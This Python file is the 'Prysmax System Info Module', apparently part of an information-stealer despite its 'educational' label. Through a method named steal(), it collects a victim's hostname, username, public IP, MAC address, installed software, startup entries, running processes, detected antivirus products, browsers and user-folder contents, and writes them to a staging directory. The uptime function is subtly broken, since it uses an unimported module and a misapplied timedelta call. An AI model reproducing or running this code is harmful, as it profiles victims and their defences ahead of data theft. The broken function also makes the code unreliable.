#!/usr/bin/env python3
"""
Prysmax System Info Module
Educational content only
"""

import os
import sys
import json
import platform
import socket
import subprocess
from datetime import datetime

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

try:
    import winreg
    WINREG_AVAILABLE = True
except ImportError:
    WINREG_AVAILABLE = False

class SystemInfo:
    def __init__(self, output_dir):
        self.output_dir = output_dir
        
    def steal(self):
        """Collect system information"""
        try:
            system_dir = os.path.join(self.output_dir, "System")
            os.makedirs(system_dir, exist_ok=True)
            
            # Collect all system information
            info = {
                "basic_info": self.get_basic_info(),
                "hardware_info": self.get_hardware_info(),
                "network_info": self.get_network_info(),
                "installed_software": self.get_installed_software(),
                "running_processes": self.get_running_processes(),
                "startup_programs": self.get_startup_programs(),
                "antivirus_info": self.get_antivirus_info(),
                "browser_info": self.get_browser_info(),
                "user_info": self.get_user_info(),
                "system_files": self.get_system_files_info()
            }
            
            # Save system information
            with open(os.path.join(system_dir, "system_info.json"), "w") as f:
                json.dump(info, f, indent=2, default=str)
            
            # Save processes to separate file
            if info["running_processes"]:
                with open(os.path.join(system_dir, "processes.txt"), "w") as f:
                    f.write(f"Running Processes ({len(info['running_processes'])} total):\n")
                    f.write("=" * 50 + "\n")
                    for process in info["running_processes"]:
                        f.write(f"{process}\n")
            
            print("[SYSTEM] System information collected")
            
        except Exception as e:
            print(f"[SYSTEM] Error collecting system info: {e}")
    
    def get_basic_info(self):
        """Get basic system information"""
        try:
            info = {
                "computer_name": socket.gethostname(),
                "username": os.getenv("USERNAME") or os.getenv("USER"),
                "os": platform.system(),
                "os_version": platform.version(),
                "os_release": platform.release(),
                "architecture": platform.architecture()[0],
                "machine": platform.machine(),
                "processor": platform.processor(),
                "python_version": platform.python_version(),
                "current_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "timezone": str(datetime.now().astimezone().tzinfo),
                "uptime": self.get_uptime()
            }
            
            # Windows-specific info
            if platform.system() == "Windows":
                info["windows_version"] = platform.win32_ver()
                info["windows_edition"] = platform.win32_edition()
            
            return info
        except Exception as e:
            return {"error": str(e)}
    
    def get_hardware_info(self):
        """Get hardware information"""
        try:
            info = {}
            
            if PSUTIL_AVAILABLE:
                # CPU info
                info["cpu_count"] = psutil.cpu_count()
                info["cpu_count_logical"] = psutil.cpu_count(logical=True)
                info["cpu_freq"] = psutil.cpu_freq()._asdict() if psutil.cpu_freq() else None
                
                # Memory info
                memory = psutil.virtual_memory()
                info["memory"] = {
                    "total": memory.total,
                    "available": memory.available,
                    "percent": memory.percent,
                    "used": memory.used,
                    "free": memory.free
                }
                
                # Disk info
                info["disks"] = []
                for partition in psutil.disk_partitions():
                    try:
                        usage = psutil.disk_usage(partition.mountpoint)
                        info["disks"].append({
                            "device": partition.device,
                            "mountpoint": partition.mountpoint,
                            "fstype": partition.fstype,
                            "total": usage.total,
                            "used": usage.used,
                            "free": usage.free,
                            "percent": (usage.used / usage.total) * 100
                        })
                    except:
                        pass
                
                # Network interfaces
                info["network_interfaces"] = {}
                for interface, addresses in psutil.net_if_addrs().items():
                    info["network_interfaces"][interface] = []
                    for addr in addresses:
                        info["network_interfaces"][interface].append({
                            "family": str(addr.family),
                            "address": addr.address,
                            "netmask": addr.netmask,
                            "broadcast": addr.broadcast
                        })
            
            return info
        except Exception as e:
            return {"error": str(e)}
    
    def get_network_info(self):
        """Get network information"""
        try:
            info = {
                "hostname": socket.gethostname(),
                "fqdn": socket.getfqdn()
            }
            
            # Get IP addresses
            try:
                # Local IP
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                info["local_ip"] = s.getsockname()[0]
                s.close()
            except:
                info["local_ip"] = "Unknown"
            
            # Get public IP
            try:
                import urllib.request
                response = urllib.request.urlopen("https://api.ipify.org", timeout=5)
                info["public_ip"] = response.read().decode()
            except:
                info["public_ip"] = "Unknown"
            
            # Get MAC address
            try:
                import uuid
                info["mac_address"] = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                                              for elements in range(0,2*6,2)][::-1])
            except:
                info["mac_address"] = "Unknown"
            
            return info
        except Exception as e:
            return {"error": str(e)}
    
    def get_installed_software(self):
        """Get list of installed software"""
        try:
            software = []
            
            if WINREG_AVAILABLE and platform.system() == "Windows":
                # Registry locations for installed software
                registry_paths = [
                    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
                    (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
                ]
                
                for hkey, path in registry_paths:
                    try:
                        registry_key = winreg.OpenKey(hkey, path)
                        for i in range(winreg.QueryInfoKey(registry_key)[0]):
                            try:
                                subkey_name = winreg.EnumKey(registry_key, i)
                                subkey = winreg.OpenKey(registry_key, subkey_name)
                                
                                try:
                                    name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                    version = ""
                                    publisher = ""
                                    
                                    try:
                                        version = winreg.QueryValueEx(subkey, "DisplayVersion")[0]
                                    except:
                                        pass
                                    
                                    try:
                                        publisher = winreg.QueryValueEx(subkey, "Publisher")[0]
                                    except:
                                        pass
                                    
                                    software.append({
                                        "name": name,
                                        "version": version,
                                        "publisher": publisher
                                    })
                                except:
                                    pass
                                
                                winreg.CloseKey(subkey)
                            except:
                                pass
                        
                        winreg.CloseKey(registry_key)
                    except:
                        pass
            
            return software[:100]  # Limit to first 100 programs
        except Exception as e:
            return [{"error": str(e)}]
    
    def get_running_processes(self):
        """Get list of running processes"""
        try:
            processes = []
            
            if PSUTIL_AVAILABLE:
                for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_info', 'cpu_percent']):
                    try:
                        processes.append({
                            "pid": proc.info['pid'],
                            "name": proc.info['name'],
                            "username": proc.info['username'],
                            "memory": proc.info['memory_info'].rss if proc.info['memory_info'] else 0,
                            "cpu_percent": proc.info['cpu_percent']
                        })
                    except:
                        pass
            else:
                # Fallback using tasklist on Windows
                if platform.system() == "Windows":
                    try:
                        result = subprocess.run(['tasklist', '/fo', 'csv'], 
                                              capture_output=True, text=True, timeout=10)
                        lines = result.stdout.strip().split('\n')[1:]  # Skip header
                        for line in lines:
                            parts = line.split('","')
                            if len(parts) >= 2:
                                processes.append({
                                    "name": parts[0].strip('"'),
                                    "pid": parts[1].strip('"')
                                })
                    except:
                        pass
            
            return processes
        except Exception as e:
            return [{"error": str(e)}]
    
    def get_startup_programs(self):
        """Get startup programs"""
        try:
            startup = []
            
            if WINREG_AVAILABLE and platform.system() == "Windows":
                registry_paths = [
                    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
                    (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
                ]
                
                for hkey, path in registry_paths:
                    try:
                        registry_key = winreg.OpenKey(hkey, path)
                        for i in range(winreg.QueryInfoKey(registry_key)[1]):
                            try:
                                name, value, _ = winreg.EnumValue(registry_key, i)
                                startup.append({
                                    "name": name,
                                    "command": value,
                                    "location": "HKLM" if hkey == winreg.HKEY_LOCAL_MACHINE else "HKCU"
                                })
                            except:
                                pass
                        winreg.CloseKey(registry_key)
                    except:
                        pass
            
            return startup
        except Exception as e:
            return [{"error": str(e)}]
    
    def get_antivirus_info(self):
        """Detect antivirus software"""
        try:
            antivirus = []
            
            # Common antivirus process names
            av_processes = [
                "avp.exe", "avguard.exe", "avgnt.exe", "avgsvc.exe",
                "mcshield.exe", "mcafeefire.exe", "windefend.exe",
                "msmpeng.exe", "nissrv.exe", "ntrtscan.exe",
                "eset.exe", "ekrn.exe", "avgwdsvc.exe", "avastui.exe",
                "avastsvc.exe", "mbam.exe", "mbamservice.exe",
                "sophosssp.exe", "trendmicro.exe", "kaspersky.exe"
            ]
            
            if PSUTIL_AVAILABLE:
                running_processes = [proc.name().lower() for proc in psutil.process_iter(['name'])]
                for av_proc in av_processes:
                    if av_proc.lower() in running_processes:
                        antivirus.append(av_proc)
            
            return antivirus
        except Exception as e:
            return [str(e)]
    
    def get_browser_info(self):
        """Get installed browsers"""
        try:
            browsers = []
            
            browser_paths = {
                "Chrome": os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe"),
                "Firefox": os.path.expanduser("~\\AppData\\Local\\Mozilla Firefox\\firefox.exe"),
                "Edge": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\Application\\msedge.exe"),
                "Opera": os.path.expanduser("~\\AppData\\Local\\Programs\\Opera\\opera.exe"),
                "Brave": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\Application\\brave.exe")
            }
            
            for browser, path in browser_paths.items():
                if os.path.exists(path):
                    try:
                        # Get version info
                        result = subprocess.run([path, "--version"], 
                                              capture_output=True, text=True, timeout=5)
                        version = result.stdout.strip() if result.returncode == 0 else "Unknown"
                    except:
                        version = "Unknown"
                    
                    browsers.append({
                        "name": browser,
                        "path": path,
                        "version": version
                    })
            
            return browsers
        except Exception as e:
            return [{"error": str(e)}]
    
    def get_user_info(self):
        """Get user information"""
        try:
            info = {
                "username": os.getenv("USERNAME") or os.getenv("USER"),
                "user_profile": os.getenv("USERPROFILE"),
                "home_dir": os.path.expanduser("~"),
                "temp_dir": os.getenv("TEMP"),
                "appdata": os.getenv("APPDATA"),
                "localappdata": os.getenv("LOCALAPPDATA")
            }
            
            return info
        except Exception as e:
            return {"error": str(e)}
    
    def get_system_files_info(self):
        """Get information about important system files"""
        try:
            files_info = {}
            
            important_files = [
                os.path.expanduser("~\\Desktop"),
                os.path.expanduser("~\\Documents"),
                os.path.expanduser("~\\Downloads"),
                os.path.expanduser("~\\Pictures"),
                os.path.expanduser("~\\Videos")
            ]
            
            for file_path in important_files:
                if os.path.exists(file_path):
                    try:
                        file_count = len([f for f in os.listdir(file_path) 
                                        if os.path.isfile(os.path.join(file_path, f))])
                        dir_count = len([d for d in os.listdir(file_path) 
                                       if os.path.isdir(os.path.join(file_path, d))])
                        
                        files_info[os.path.basename(file_path)] = {
                            "path": file_path,
                            "files": file_count,
                            "directories": dir_count
                        }
                    except:
                        files_info[os.path.basename(file_path)] = {"error": "Access denied"}
            
            return files_info
        except Exception as e:
            return {"error": str(e)}
    
    def get_uptime(self):
        """Get system uptime"""
        try:
            if PSUTIL_AVAILABLE:
                boot_time = psutil.boot_time()
                uptime_seconds = time.time() - boot_time
                return str(datetime.timedelta(seconds=int(uptime_seconds)))
            else:
                return "Unknown"
        except Exception as e:
            return str(e)

